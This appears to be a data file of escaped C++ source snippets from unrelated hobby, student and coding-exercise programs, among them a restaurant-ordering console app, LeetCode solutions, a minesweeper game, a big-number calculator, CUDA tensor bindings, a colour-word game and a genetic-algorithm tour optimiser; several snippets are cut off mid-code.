comanda->setLocatie(true); //optiunea 2 pt la pachet, optiunea 1 pentru in restaurant\n                } else {\n                    if (optiune == 1) {\n                        comanda->setLocatie(false);\n                    }\n                }\n                cout << endl;\n                meniu->afisare_meniu();\n                while (!cmd) {\n                    cout << endl;\n                    comanda->afiseazaComanda();\n                    cout <<\n                            \"\\n\\t1. Alege un produs si adauga-l la comanda ta!\"\n                            \"\\n\\t2. Modifica comanda ta\"\n                            \"\\n\\t3. Finalizeaza comanda\\n\";\n                    unsigned int optiune_comanda;\n                    cout << \"Optiune: \";\n                    cin >> optiune_comanda;\n                    switch (optiune_comanda) {\n                        case 1: {\n                            unsigned int id;\n                            cout << \"Ce produs doresti?\\nIntrodu id-ul produsului: \";\n                            cin >> id;\n                            comanda->adauga_element(meniu, id);\n                            break;\n                        }\n                        case 2:\n                            comanda->modificaCantitate();\n                            break;\n                        case 3:\n                            cout << \"Inca putin si am terminat! (default anuleaza comanda)\\n\";\n                            comanda->confirmaComanda(staff);\n                            cmd = true;\n                            break;\n                        default:\n                            cout << \"Alege una dintre optiunile indicate!\\n\";\n                            break;\n                    }\n                }\n                break;\n            }\n            case 2:\n                staff.afiseazaStatusComenzi();\n                break;\n            case 3: {\n                const string parola = \"ciscosecpa55\";\n                string incercare;\n                cout << \"Introdu parola: \";\n                cin >> incercare;\n\n                if (incercare == parola) {\n                    cout << \"Bine ai venit!\\n\";\n                    bool stf = false;\n                    while (!stf) {\n                        cout <<\n                                \"\\t1. Adauga un element in meniu\"\n                                \"\\n\\t2. Modifica un element din meniu\"\n                                \"\\n\\t3. Sterge un element din meniu\"\n                                \"\\n\\t4. Modifica status-ul unei comenzi\"\n                                \"\\n\\t5",
    "class Solution {\npublic:\n    int m, n;\n    vector<vector<int>> directions{{1, 0}, {-1, 0},{0, 1},{0, -1}};\n\n    int DFS(vector<vector<int>>& grid, int i, int j, int& id) {\n        if(i < 0 || i >= m || j < 0 || j >= n || grid[i][j] != 1)\n            return 0;\n        \n        grid[i][j] = id;\n        int count  = 1;\n        \n        for(vector<int>& dir : directions) {\n            int x = i + dir[0];\n            int y = j + dir[1];\n            \n            count += DFS(grid, x, y, id);\n        }\n        \n        return count;\n    }\n    int largestIsland(vector<vector<int>>& grid) {\n        m = grid.size();\n        n = grid[0].size();\n        int maxArea = 0;\n        unordered_map<int, int> mp;\n        int island_id = 2;\n        \n        for(int i = 0; i<m; i++) {\n            for(int j = 0; j<n; j++) {\n                if(grid[i][j] == 1) {\n                    int size = DFS(grid, i, j, island_id);\n                    maxArea = max(maxArea, size);\n                    mp[island_id] = size;\n                    island_id++;\n                }\n            }\n        }\n        \n        for(int i = 0; i<m; i++) {\n            for(int j = 0; j<n; j++) {\n                if(grid[i][j] == 0) {\n                    unordered_set<int> st;\n                    for(vector<int>& dir : directions) {\n                        int x = i + dir[0];\n                        int y = j + dir[1];\n                        if(x >= 0 && x < m && y >= 0 && y < n && grid[x][y] != 0)\n                            st.insert(grid[x][y]);\n                    }\n                    \n                    int sum = 1; //converting current 0 to 1\n                    for(const int &s : st) {\n                        sum += mp[s];\n                    }\n                    maxArea = max(maxArea, sum);\n                }\n            }\n        }\n        \n        return maxArea;\n    }\n};",
    "#include <iostream>\n#include <cstdlib>\n#include <ctime>\n\n#include <string.h>\n#include <cstdio>\n\nusing std::cout;\nusing std::cin;\nusing std::endl;\n\nconst int SIZE {5};\nconst int MINES {5};\n\nchar board[SIZE][SIZE];\nbool revealed[SIZE][SIZE] = {false};\n\nvoid initBoard() {\n    for (int i = 0; i < SIZE; ++i) \n        for (int j = 0; j < SIZE; ++j) \n            board[i][j] = '.';\n\n    int minesPlaced = 0;\n    while (minesPlaced < MINES) {\n        int x = rand() % SIZE;\n        int y = rand() % SIZE;\n        if (board[x][y] != '*') {\n            board[x][y] = '*';\n            minesPlaced++;\n        }\n    }\n}\n\nvoid displayBoard() {\n    for (int i = 0; i < SIZE; ++i) {\n        for (int j = 0; j < SIZE; ++j) {\n            if (revealed[i][j]) printf(\"%c \", board[i][j]);\n            else printf(\". \");\n        }\n        printf(\"\\n\");\n    }\n}\n\nint main() {\n    srand(time(0));\n    initBoard();\n\n    int x, y;\n    while (true) {\n        displayBoard();\n        printf(\"Enter the coordinates (x y): \");\n        scanf(\"%d %d\", &x, &y);\n\n        if (x < 0 || x >= SIZE || y < 0 || y >= SIZE) {\n            puts(\"Incorrect coordinates! Try again.\");\n            continue;\n        }\n\n        if (board[x][y] == '*') {\n            puts(\"You've stepped on a landmine! The game is over.\");\n            revealed[x][y] = true;\n            displayBoard();\n            break;\n        }\n\n        revealed[x][y] = true;\n        board[x][y] = ' ';\n\n        bool win = true;\n        for (int i = 0; i < SIZE; ++i) {\n            for (int j = 0; j < SIZE; ++j) {\n                if (board[i][j] != '*' && !revealed[i][j]) {\n                    win = false;\n                    break;\n                }\n            }\n            if (!win) break;\n        }\n        if (win) {puts(\"Congratulations! You've won!\"); displayBoard(); break;}\n    }\n\n    return 0;\n}\n",
    "\n#include <span>\n#include <vector>\n#include <string>\n#include <string_view>\nusing namespace std;\n\nclass Solution {\n\npublic:\n    vector<int> vowelStrings(const vector<string>& words, const vector<vector<int>>& queries) const {\n        vector<int> prefixSum = createPrefixSumForWordsThatStartAndEndWithVowel(words);\n        return countNumberOfWordsInInclusiveRangeThatStartAndEndWithVowel(prefixSum, queries);\n    }\n\nprivate:\n    vector<int> createPrefixSumForWordsThatStartAndEndWithVowel(span<const string> words) const {\n        vector<int> prefixSum(words.size());\n        prefixSum[0] = startsAndEndsWithVowel(words[0]) ? 1 : 0;\n        for (size_t i = 1; i < words.size(); ++i) {\n            prefixSum[i] = prefixSum[i - 1] + (startsAndEndsWithVowel(words[i]) ? 1 : 0);\n        }\n        return prefixSum;\n    }\n\n    vector<int> countNumberOfWordsInInclusiveRangeThatStartAndEndWithVowel(span<const int> prefixSum, span<const vector<int>> queries) const {\n        vector<int> numberOfWordsInInclusiveRangeThatStartAndEndWithVowel(queries.size());\n        for (size_t i = 0; i < queries.size(); ++i) {\n            size_t start = queries[i][0];\n            size_t end = queries[i][1];\n            numberOfWordsInInclusiveRangeThatStartAndEndWithVowel[i]\n                    = prefixSum[end] - (start > 0 ? prefixSum[start - 1] : 0);\n        }\n        return numberOfWordsInInclusiveRangeThatStartAndEndWithVowel;\n    }\n\n    bool startsAndEndsWithVowel(string_view word) const {\n        return isVowel(word[0]) && isVowel(word[word.length() - 1]);\n    }\n\n    bool isVowel(char letter) const {\n        return letter == 'a' || letter == 'e' || letter == 'i' || letter == 'o' || letter == 'u';\n    }\n};\n",
    "#include <iostream>\n#include <string>\n#include <vector>\n#include <algorithm>\nusing namespace std;\n\n// Function to add two large numbers represented as strings\nstring addLargeNumbers(const string& num1, const string& num2) {\n    string result;\n    int carry = 0, sum = 0;\n    int i = num1.size() - 1, j = num2.size() - 1;\n\n    while (i >= 0 || j >= 0 || carry) {\n        int digit1 = (i >= 0) ? num1[i--] - '0' : 0;\n        int digit2 = (j >= 0) ? num2[j--] - '0' : 0;\n        sum = digit1 + digit2 + carry;\n        carry = sum / 10;\n        result.push_back((sum % 10) + '0');\n    }\n\n    reverse(result.begin(), result.end());\n    return result;\n}\n\n// Function to subtract two large numbers represented as strings\nstring subtractLargeNumbers(const string& num1, const string& num2) {\n    string result;\n    int borrow = 0, diff = 0;\n    int i = num1.size() - 1, j = num2.size() - 1;\n\n    while (i >= 0 || j >= 0) {\n        int digit1 = (i >= 0) ? num1[i--] - '0' : 0;\n        int digit2 = (j >= 0) ? num2[j--] - '0' : 0;\n        digit2 += borrow;\n\n        if (digit1 < digit2) {\n            borrow = 1;\n            digit1 += 10;\n        }\n        else {\n            borrow = 0;\n        }\n\n        diff = digit1 - digit2;\n        result.push_back(diff + '0');\n    }\n\n    // Remove leading zeros\n    while (result.size() > 1 && result.back() == '0')\n        result.pop_back();\n\n    reverse(result.begin(), result.end());\n    return result;\n}\n\n// Function to multiply two large numbers represented as strings\nstring multiplyLargeNumbers(const string& num1, const string& num2) {\n    int n = num1.size(), m = num2.size();\n    vector<int> result(n + m, 0);\n\n    for (int i = n - 1; i >= 0; --i) {\n        for (int j = m - 1; j >= 0; --j) {\n            int mul = (num1[i] - '0') * (num2[j] - '0');\n            int sum = mul + result[i + j + 1];\n            result[i + j + 1] = sum % 10;\n            result[i + j] += sum / 10;\n        }\n    }\n\n    string resultStr;\n    for (int num : result) {\n        if (!(resultStr.empty() && num == 0)) {\n            resultStr.push_back(num + '0');\n        }\n    }\n\n    return resultStr.empty() ? \"0\" : resultStr;\n}\n\n// Function to divide two large numbers represented as strings\nstring divideLargeNumbers(const string& num1, const string& num2, int precision) {\n    if (num2 == \"0\") return \"Error: Division by zero\";\n\n    string result = \"\";\n    string remainder = \"0\";\n\n    for (size_t i = 0; i < num1.size(); ++i) {\n        remainder += num1[i];\n        int count = 0;\n\n        while (remainder.size() > num2.size() ||\n            (remainder.size() == num2.size() && remainder >= num2)) {\n            remainder = subtractLargeNumbers(remainder, num2);\n            count++;\n        }\n\n        result += to_string(count);\n    }\n\n    // Handle precision\n    if (precision > 0) {\n        result += \".\";\n        for (int i = 0; i < precision; ++i) {\n            remainder += \"0\";\n            int count = 0;\n            while (remainder.size() > num2.size() ||\n                (remainder.size() == num2.size() && remainder >= num2)) {\n                remainder = subtractLargeNumbers(remainder, num2);\n                count++;\n            }\n            result += to_string(count);\n        }\n    }\n\n    // Remove leading zeros in result\n    result.erase(0, min(result.find_first_not_of('0'), result.size() - 1));\n    return result.empty() ? \"0\" : result;\n}\n\n// Conversion Functions\nvoid convertWeight() {\n    double value;\n    string unit;\n    cout << \"Enter the weight value: \";\n    cin >> value;\n    cout << \"Enter the unit (kg, lb): \";\n    cin >> unit;\n\n    if (unit == \"kg\") {\n        cout << value << \" kg = \" << value * 2.20462 << \" lb\" << endl;\n    }\n    else if (unit == \"lb\") {\n        cout << value << \" lb = \" << value / 2.20462 << \" kg\" << endl;\n    }\n    else {\n        cout << \"Invalid unit!\" << endl;\n    }\n}\n\nvoid convertTemperature() {\n    double value;\n    string unit;\n    cout << \"Enter the temperature value: \";\n    cin >> value;\n    cout << \"Enter the unit (C, F): \";\n    cin >> unit;\n\n    if (unit == \"C\") {\n        cout << value << \" \u00b0C = \" << (value * 9 / 5) + 32 << \" \u00b0F\" << endl;\n    }\n    else if (unit == \"F\") {\n        cout << value << \" \u00b0F = \" << (value - 32) * 5 / 9 << \" \u00b0C\" << endl;\n    }\n    else {\n        cout << \"Invalid unit!\" << endl;\n    }\n}\n\nvoid convertLength() {\n    double value;\n    string unit;\n    cout << \"Enter the length value: \";\n    cin >> value;\n    cout << \"Enter the unit (m, ft): \";\n    cin >> unit;\n\n    if (unit == \"m\") {\n        cout << value << \" m = \" << value * 3.28084 << \" ft\" << endl;\n    }\n    else if (unit == \"ft\") {\n        cout << value << \" ft = \" << value / 3.28084 << \" m\" << endl;\n    }\n    else {\n        cout << \"Invalid unit!\" << endl;\n    }\n}\n\nvoid convertVolume() {\n    double value;\n    string unit;\n    cout << \"Enter the volume value: \";\n    cin >> value;\n    cout << \"Enter the unit (L, gal): \";\n    cin >> unit;\n\n    if (unit == \"L\") {\n        cout << value << \" L = \" << value * 0.264172",
    "#include <torch/extension.h>\n\n#include <c10/cuda/CUDAGuard.h>\n#include <c10/cuda/CUDAStream.h>\n\n#include <memory>\n#include <vector>\n\n#include \"common.h\"\n\nvoid run_sample_points_kernel_forward(\n    const torch::Tensor &depth,\n    const torch::Tensor &points,\n    const torch::Tensor &pix_to_face,\n    const torch::Tensor &tri_to_tetra,\n    const torch::Tensor &tetras,\n    const int n_tetras,\n    const int n_rays,\n    const int n_max_samples,\n    const int buffer_size,\n    const float step_size,\n    float *t_starts,\n    float *t_ends,\n    int *tetra_indices,\n    int *ray_indices,\n    float *barys,\n    float *sampled_points,\n    int *packed_info,\n    int *numsteps_counter,\n    cudaStream_t stream);\n\nstd::vector<torch::Tensor> sample_points_forward(\n    torch::Tensor depth,\n    torch::Tensor points,\n    torch::Tensor pix_to_face,\n    torch::Tensor tri_to_tetra,\n    torch::Tensor tetras,\n    int n_tetras,\n    int n_rays,\n    int n_max_samples,\n    int buffer_size,\n    float step_size,\n    torch::Tensor t_starts,\n    torch::Tensor t_ends,\n    torch::Tensor tetra_indices,\n    torch::Tensor ray_indices,\n    torch::Tensor barys,\n    torch::Tensor sampled_points,\n    torch::Tensor packed_info,\n    torch::Tensor numsteps_counter)\n{\n    cudaStream_t stream = c10::cuda::getCurrentCUDAStream();\n\n    CHECK_INPUT(depth);\n    CHECK_INPUT(points);\n    CHECK_INPUT(pix_to_face);\n    CHECK_INPUT(tri_to_tetra);\n    CHECK_INPUT(tetras);\n    CHECK_INPUT(t_starts);\n    CHECK_INPUT(t_ends);\n    CHECK_INPUT(ray_indices);\n    CHECK_INPUT(tetra_indices);\n    CHECK_INPUT(barys);\n    CHECK_INPUT(sampled_points);\n    CHECK_INPUT(packed_info);\n    CHECK_INPUT(numsteps_counter);\n\n    run_sample_points_kernel_forward(\n        depth,\n        points,\n        pix_to_face,\n        tri_to_tetra,\n        tetras,\n        n_tetras,\n        n_rays,\n        n_max_samples,\n        buffer_size,\n        step_size,\n        t_starts.data_ptr<float>(),\n        t_ends.data_ptr<float>(),\n        tetra_indices.data_ptr<int>(),\n        ray_indices.data_ptr<int>(),\n        barys.data_ptr<float>(),\n        sampled_points.data_ptr<float>(),\n        packed_info.data_ptr<int>(),\n        numsteps_counter.data_ptr<int>(),\n        stream);\n\n    return {};\n}\n\nvoid run_sample_occ_tet_kernel_forward(\n    const torch::Tensor &tetras,\n    const int n_tetras,\n    const int n_points_per_tet,\n    float *sampled_points,\n    cudaStream_t stream);\n\nstd::vector<torch::Tensor> sample_occ_tet_kernel_forward(\n    torch::Tensor tetras,\n    int n_tetras,\n    int n_points_per_tet,\n    torch::Tensor sampled_points)\n{\n    cudaStream_t stream = c10::cuda::getCurrentCUDAStream();\n\n    CHECK_INPUT(tetras);\n    CHECK_INPUT(sampled_points);\n\n    run_sample_occ_tet_kernel_forward(\n        tetras,\n        n_tetras,\n        n_points_per_tet,\n        sampled_points.data_ptr<float>(),\n        stream);\n\n    return {};\n}\n\nvoid run_sample_points_kernel_backward(\n    const torch::Tensor &tetpoints,\n    const torch::Tensor &canonical_tetpoints,\n    const torch::Tensor &sampled_points,\n    const torch::Tensor &bary,\n    const torch::Tensor &grad_output,\n    const torch::Tensor &tetra_indices,\n    float *grad_tetpoints,\n    cudaStream_t stream);\n\nstd::vector<torch::Tensor> sample_points_backward(\n    torch::Tensor tetpoints,\n    torch::Tensor canonical_tetpoints,\n    torch::Tensor sampled_points,\n    torch::Tensor bary,\n    torch::Tensor grad_output,\n    torch::Tensor tetra_indices,\n    torch::Tensor grad_tetpoints)\n{\n    cudaStream_t stream = c10::cuda::getCurrentCUDAStream();\n    // auto stream = std::make_unique<StreamAndEvent>()->get();\n\n    CHECK_INPUT(tetpoints);\n    CHECK_INPUT(canonical_tetpoints);\n    CHECK_INPUT(sampled_points);\n    CHECK_INPUT(bary);\n    CHECK_INPUT(grad_output);\n    CHECK_INPUT(tetra_indices);\n    CHECK_INPUT(grad_tetpoints);\n\n    run_sample_points_kernel_backward(\n        tetpoints,\n        canonical_tetpoints,\n        sampled_points,\n        bary,\n        grad_output,\n        tetra_indices,\n        grad_tetpoints.data_ptr<float>(),\n        stream);\n\n    return {};\n}\n\nvoid run_barycentric_kernel(\n    const torch::Tensor &tetras,\n    const torch::Tensor &points,\n    const torch::Tensor &closest_faces,\n    const torch::Tensor &tri_to_tetra,\n    float *barys,\n    int *tetra_id,\n    int *active_points,\n    cudaStream_t stream\n);\n\nstd::vector<torch::Tensor> compute_bary(\n    torch::Tensor tetras,\n    torch::Tensor points,\n    torch::Tensor closest_faces,\n    torch::Tensor tri_to_tetra,\n    torch::Tensor barys,\n    torch::Tensor tetra_id,\n    torch::Tensor active_points)\n{\n    CHECK_INPUT(tetras);\n    CHECK_INPUT(points);\n    CHECK_INPUT(closest_faces);\n    CHECK_INPUT(tri_to_tetra);\n    CHECK_INPUT(barys);\n    CHECK_INPUT(tetra_id);\n    CHECK_INPUT(active_points);\n\n    cudaStream_t stream = c10::cuda::getCurrentCUDAStream();\n\n    run_barycentric_kernel(\n        tetras,\n        points,\n        closest_faces,\n        tri_to_tetra,\n        barys.data_ptr<float>(),\n        tetra_id.data",
    "#include\"MBUTTON.h\"\n#include\"RuleInitSpace.h\"\n#include\"initspace.h\"\n#include\"PropInitSpace.h\"\n#include\"liang.h\"\n#include<ctime>\n#include<cmath>\n#include<graphics.h>\n#include<fstream>\n#include <sstream> // \u5305\u542b\u6807\u51c6\u5e93\u4e2d\u7684\u5b57\u7b26\u4e32\u6d41\u5934\u6587\u4ef6\n#include <iomanip> // \u5305\u542b\u8bbe\u7f6e\u6d6e\u70b9\u6570\u7cbe\u5ea6\u7684\u5934\u6587\u4ef6\nusing namespace init;\nusing namespace RuleInit;\nusing namespace PropSpace;\nusing std::ifstream;\nusing std::ofstream;\n\n//24.12.13\u65e5\u51cc\u666812\u70b9\uff0c\u57fa\u672c\u4e0a\u5b8c\u6210\u4e86Button\u7684\u5bf9\u8c61\u642d\u5efa\n//24.12.14\u665a\u4e0a22\u70b9\uff0c\u8fd8\u8981\u5b8c\u6210\u6e38\u620f\u4e3b\u4f53\u903b\u8f91\u7684\u642d\u5efa\uff0c\u540c\u65f6\u8981\u5b8c\u5584endgame\u4e0eclearmenu\u90a3\u91cc\u7684\u903b\u8f91\u5173\u7cfb\uff0c\u8fd9\u4e24\u4e2a\u6709\u70b9\u91cd\u590d\u4e86\uff0c\u8003\u8651\u662f\u5426\u8981\u52a0\u5165\u6682\u505c\u6309\u94ae\n//24.12.21\u51cc\u666812\u70b9\uff0c\u5b8c\u6210\u4e86ui\u754c\u9762\u7684\u66f4\u65b0\uff0c\u540e\u7eed\u9700\u8981\u5b8c\u6210\u6a21\u5f0f\u7684\u9009\u62e9\u90e8\u5206\u7684\u4ee3\u7801\uff0c\u4ee5\u53ca\u6e38\u620f\u4e3b\u4f53\u754c\u9762\u6839\u636e\u6a21\u5f0f\u7684\u6539\u53d8\uff0c\u4ee5\u53ca\u7ed3\u7b97\u754c\u9762\uff0c\u5173\u4e8e\u4f5c\u8005\u754c\u9762\uff08\u5220\u9664\u4e86\u6392\u884c\u699c\uff09\uff0c\u5f00\u59cb\u6e38\u620f\u524d\u4e09\u79d2\u5012\u6570\n\n//\u91cd\u65b0\u8bbe\u7f6e\u6309\u94ae\u7684\u503c\ninline void resetbuttons() {\n\tint n = 0;\n\tint a[8][2] = {0};\n\tCOLOR ass[8] = { black,green,yellow,red,brown,blue,purple,cyan };\n\twstring s[8]= { { _T(\"\u9ed1\u8272\") } ,{ _T(\"\u7eff\u8272\") } ,{ _T(\"\u9ec4\u8272\") } ,{ _T(\"\u7ea2\u8272\") } ,\n\t\t\t\t\t{ _T(\"\u68d5\u8272\") } ,{ _T(\"\u84dd\u8272\") } ,{ _T(\"\u7d2b\u8272\") }, { _T(\"\u9752\u8272\") } };\n\twstring tmps;\n\tsrand(time(0));\n\tint tmp1,tmp2;\n\twhile (n < 8) {\n\t\ttmp1 = rand() % 8, tmp2 = rand() % 8;\n\t\tif (!a[tmp1][0] && !a[tmp2][1]) {\n\t\t\ttmps = s[tmp2];\n\t\t\tswitch (n) {\n\t\t\tcase 0:player1.reset(ass[tmp1], tmps); break;\n\t\t\tcase 1:player2.reset(ass[tmp1], tmps); break;\n\t\t\tcase 2:player3.reset(ass[tmp1], tmps); break;\n\t\t\tcase 3:player4.reset(ass[tmp1], tmps); break;\n\t\t\tcase 4:player5.reset(ass[tmp1], tmps); break;\n\t\t\tcase 5:player6.reset(ass[tmp1], tmps); break;\n\t\t\tcase 6:player7.reset(ass[tmp1], tmps); break;\n\t\t\tcase 7:player8.reset(ass[tmp1], tmps); break;\n\t\t\t}\n\t\t\ta[tmp1][0] = a[tmp2][1] = 1;\n\t\t\tn++;\n\t\t}\n\t}\n\twhile (1) {\n\t\ttmp1 = rand() % 8, tmp2 = rand() % 8;\n\t\tif (tmp1 != tmp2) {\n\t\t\ttmps = s[tmp2];\n\t\t\tquestion.reset(ass[tmp1], tmps);\n\t\t\tbreak;\n\t\t}\n\t}\n}\n\n//\u653e\u7f6eplayer\u7c7b\u6309\u94ae\ninline void putplayers() {\n\tquestion.putthings();\n\tplayer1.putthings();\n\tplayer2.putthings();\n\tplayer3.putthings();\n\tplayer4.putthings();\n\tplayer5.putthings();\n\tplayer6.putthings();\n\tplayer7.putthings();\n\tplayer8.putthings();\n}\n\n//\u653e\u7f6e\u5f53\u524d\u6a21\u5f0f\u6587\u672c\nIMAGE CHMODEBK, CHMODE_REPLACE;\nwstring nowmode = _T(\"\u5f53\u524d\u6a21\u5f0f\u4e3a\uff1a\");\nIMAGE NOWMODE;\ninline void putnowmode() {\n\tRECT nowmode_rect = { 0,0,1280,150 };\n\tnowmode = _T(\"\u5f53\u524d\u6a21\u5f0f\u4e3a\uff1a\");\n\n\tswitch (GAMEMODE) {\n\tcase race: {\n\t\tnowmode += _T(\"\u7ade\u901f\u6a21\u5f0f\");\n\t\tif (DIFFICULTY_TIME == 15)nowmode += _T(\" - 15\u79d2\");\n\t\telse if (DIFFICULTY_TIME == 30)nowmode += _T(\" - 30\u79d2\");\n\t\telse nowmode += _T(\" - 60\u79d2\");\n\t\tbreak;\n\t}\n\tcase survival: {\n\t\tnowmode += _T(\"\u751f\u5b58\u6a21\u5f0f\");\n\t\tif (DIFFICULTY_HP == 5)nowmode += _T(\" - 5\u751f\u547d\u503c\");\n\t\telse if (DIFFICULTY_HP == 3)nowmode += _T(\" - 3\u751f\u547d\u503c\");\n\t\telse nowmode += _T(\" - 1\u751f\u547d\u503c\");\n\t\tbreak;\n\t}\n\tcase limit: {\n\t\tnowmode += _T(\"\u5355\u9650\u6a21\u5f0f\");\n\t\tif (DIFFICULTY_TIME == 5)nowmode += _T(\" - 5\u79d2\");\n\t\telse if (DIFFICULTY_TIME == 3)nowmode += _T(\" - 3\u79d2\");\n\t\telse nowmode += _T(\" - 8\u79d2\");\n\t\tbreak;\n\t}\n\tcase hell: {\n\t\tnowmode += _T(\"\u5730\u72f1\u6a21\u5f0f\");\n\t\tif (DIFFICULTY_TIME == 5)nowmode += _T(\" - 5\u79d2\");\n\t\telse if (DIFFICULTY_TIME == 3)nowmode += _T(\" - 3\u79d2\");\n\t\telse nowmode += _T(\" - 8\u79d2\");\n\t\tif (DIFFICULTY_HP == 5)nowmode += _T(\" - 5\u751f\u547d\u503c\");\n\t\telse if (DIFFICULTY_HP == 3)nowmode += _T(\" - 3\u751f\u547d\u503c\");\n\t\telse nowmode += _T(\" - 1\u751f\u547d\u503c\");\n\t\tbreak;\n\t}\n\t}\n\tsettextcolor(YELLOW);\n\tsetbkmode(TRANSPARENT);\n\tsettextstyle(50, 0, _T(\"\u534e\u6587\u7425\u73c0\"));\n\t//putimage(0, 0, &CHMODE_REPLACE);\n\tPutimage(210, 35, &NOWMODE);\n\tdrawtext(nowmode.c_str(), &nowmode_rect, DT_NOCLIP | DT_SINGLELINE | DT_CENTER | DT_VCENTER);\n}\n\n//\u7ed3\u7b97\u754c\u9762\u9009\u62e9\u6a21\u5f0f\ninline void choosemode_clearmenu();\n\n//\u521d\u59cb\u5316\u5b58\u50a8\u6a21\u5f0f\u7684\u6587\u4ef6\u2014\u2014\u2014\u2014\u5df2\u521d\u59cb\u531624.12.26\nvoid initmodefile() {\n\tofstream ofs(\"datas/mode/mode.txt\", std::ios::out | std::ios::binary);\n\tGameMode x = race;\n\tint d1 = 60, d2 = 5;\n\tofs.write((const char*)&x, sizeof(GameMode));\n\tofs.write((const char*)&d1, sizeof(int));\n\tofs.write((const char*)&d2, sizeof(int));\n\tofs.close();\n\tifstream ifs(\"datas/mode/mode.txt\", std::ios::in | std::ios::binary);\n\tGameMode tmp;\n\tint t;\n\tifs.read((char*)&tmp, sizeof(GameMode));\n\tif (tmp == race)std::cout << \"YES\" << std::endl;\n\tifs.read((char*)&t, sizeof(int));\n\tif (t == 60)std::cout << t << std::endl;\n\tifs.read((char*)&t, sizeof(int));\n\tif (t == 5)std::cout << t << std::endl;\n\tifs.close();\n\n}\n\n//\u8bfb\u53d6\u6a21\u5f0f\u53ca\u96be\u5ea6\u6587\u4ef6\nvoid ReadModeFile() {\n\tifstream ifs(\"datas/mode/mode.txt\", std::ios::in | std::ios::binary);\n\tifs.read((char*)&GAMEMODE, sizeof(GameMode));\n\t//if (GAMEMODE == race)std::cout << \"RACE\" << std::endl;\n\tint tmp;\n\tifs.read((char*)&tmp, sizeof(int));\t//\u5148\u8bfb\u53d6\u65f6\u95f4\n\tDIFFICULTY_TIME = tmp;\n\t//std::cout <<\"TIME\" << DIFFICULTY_TIME << std::endl;\n\tifs.read((char*)&tmp, sizeof(int));\t//\u518d\u8bfb\u53d6\u751f\u547d\n\tDIFFICULTY_HP = tmp;\n\t//std::cout <<\"HP\" << DIFFICULTY_HP << std::endl;\n\tifs.close();\n}\n\n//\u66f4\u65b0\u6a21\u5f0f\u53ca\u96be\u5ea6\u6587\u4ef6\nvoid UpdateModeFile() {\n\tofstream ofs(\"datas/mode/mode.txt\", std::ios::out | std::ios::binary);\n\t//if (ofs.is_open())std::cout << \"YES\" << std::endl;\n\tofs.write((const char*)&GAMEMODE, sizeof(GameMode));\n\tint tmp = DIFFICULTY_TIME;\n\tofs.write((const char*)&tmp, sizeof(int));\n\t//std::cout << \"TIME\" << DIFFICULTY_TIME << std::endl;\n\ttmp = DIFFICULTY_HP;\n\tofs.write((const char*)&tmp, sizeof(int));\n\t//std::cout << \"HP\" << DIFFICULTY_HP << std::endl;\n\tofs.close();\n}\n\n//\u5224\u65ad\u662f\u5426\u56de\u7b54\u6b63\u786e\uff0c\u5e76\u653e\u7f6e\u52fe\u53c9\nIMAGE BINGO,WRONG;\nvoid PutBingoWrong() {\n\tDWORD NOW_BWTIME = GetTickCount()",
    "#include <iostream>\n#include <iomanip>\n#include \"SingletonFacade.hpp\"\n#include \"GeneticSystem.hpp\"\n#include \"TourPopulationFactory.hpp\"\n\nconstexpr int FIRST = 0;\nconstexpr int TWO = 2;\nconstexpr int SIX = 6;\nconstexpr int ITERATIONS = 1000;\nconstexpr double IMPROVEMENT_FACTOR = 1.5;\nvoid clean_up(const std::vector<City*>& cities, const TourPopulationFactory *factory);\nvoid print_original_elite_data(const Tour& base_elite);\nvoid reprint_original_elite(const Tour& base_elite, double base_distance);\nvoid print_best_elite(const Tour& final_elite);\nvoid print_final_report(const GeneticInfo & data, const Tour & final_elite);\n\nvoid SingletonFacade::run() {\n    auto data = GeneticInfo{};\n\n    //initialize population\n    const auto * factory = new TourPopulationFactory{};\n    data.tours = factory->createPopulation();\n    data.base_elite = data.tours[FIRST];\n    data.base_distance = data.base_elite.get_tour_distance();\n    data.best_distance = data.base_distance;\n\n    // Print the original Elite data\n    print_original_elite_data(data.base_elite);\n\n    // Sets up the variables for the Genetic Algorithm\n    std::cout << \"Enter your mutation rate (A2 suggests 15)\" << std::endl;\n    std::cin >> data.mutation_rate;\n    const GeneticSystem genetic_system(&data);\n    // std::vector<Tour> data.tours = data.tours;\n\n     // while termination criteria not reached.\n     while(data.base_distance/data.best_distance < IMPROVEMENT_FACTOR && data.iterations < ITERATIONS) {\n         // Run the latest set of data.tours through the Genetic System\n         genetic_system.iterate_next(data.tours);\n     }\n\n    const Tour final_elite = data.tours[FIRST];\n    print_final_report(data, final_elite);\n    clean_up(data.tours[0].get_cities(), factory);\n}\n\nvoid print_final_report(const GeneticInfo & data, const Tour & final_elite) {\n    std::cout << \"--- FINISHED ALGORITHM ---\" << std::endl;\n    std::cout << \"Total iterations: \" << data.iterations << std::endl;\n    std::cout << std::endl;\n    reprint_original_elite(data.base_elite, data.base_distance);\n    print_best_elite(final_elite);\n\n    if (data.base_distance/data.best_distance >= IMPROVEMENT_FACTOR) {\n        std::cout << std::endl;\n        std::cout << \"Improvement factor reached!\" << std::endl;\n        std::cout << \"Improvement factor: \" << std::fixed << std::setprecision(SIX) <<\n            data.improvement_factor << std::endl;\n    }\n}\n\nvoid print_original_elite_data(const Tour& base_elite) {\n    std::cout << std::endl;\n    std::cout << \"Original Elite Distance: \" << base_elite.get_tour_distance() << std::endl;\n    std::cout << \"(\";\n    for (int i = 0; i < base_elite.get_number_of_cities(); i++) {\n        std::cout << base_elite.get_city_name(i) << \"->\";\n    }\n    std::cout << base_elite.get_city_name(0) << \")\" << std::endl;\n    std::cout << \"--- STARTING ALGORITHM ---\" << std::endl;\n}\n\nvoid reprint_original_elite(const Tour& base_elite, double base_distance) {\n    std::cout << \"Original Elite:\" << std::endl;\n    std::cout << \"Distance: \" << std::fixed << std::setprecision(TWO) << base_distance << std::endl;\n    std::cout << \"(\";\n    for (int i = 0; i < base_elite.get_number_of_cities(); i++) {\n        std::cout << base_elite.get_city_name(i) << \"->\";\n    }\n    std::cout << base_elite.get_city_name(0) << \")\" << std::endl;\n    std::cout << std::endl;\n}\n\nvoid print_best_elite(const Tour& final_elite) {\n    std::cout << \"Best Elite:\" << std::endl;\n    std::cout << \"Distance: \" << std::fixed << std::setprecision(TWO) << final_elite.get_tour_distance() << std::endl;\n    std::cout << \"(\";\n    for (int i = 0; i < final_elite.get_number_of_cities(); i++) {\n        std::cout << final_elite.get_city_name(i) << \"->\";\n    }\n    std::cout << final_elite.get_city_name(0) << \")\" << std::endl;\n}\n\nvoid clean_up(const std::vector<City*>& cities, const TourPopulationFactory *factory) {\n    for(auto & city : cities) {\n        delete city;\n    }\n    delete factory;\n}\n",
